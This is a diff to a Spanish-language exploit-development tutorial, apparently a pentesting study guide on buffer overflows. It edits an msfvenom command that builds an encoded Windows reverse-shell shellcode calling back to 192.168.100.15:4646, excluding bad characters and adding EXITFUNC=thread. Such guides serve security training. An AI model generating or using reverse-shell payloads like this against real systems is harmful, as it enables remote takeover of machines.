@@ -103,7 +103,7 @@ Donde especificamos los badchar que no queremos que se incluya en el nuevo `byte
 ## Generar la shellcode
 ### Ejemplo de Shellcode
 ```shell
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.15 LPORT=4646 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.15 LPORT=4646 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai EXITFUNC=thread -f c
 ```
 Donde especificamos la aqrquitectura del sistema, los badchars que no queremos que se incluyan en el shellcode.
 ## Para escuchar el puerto podemos usar 
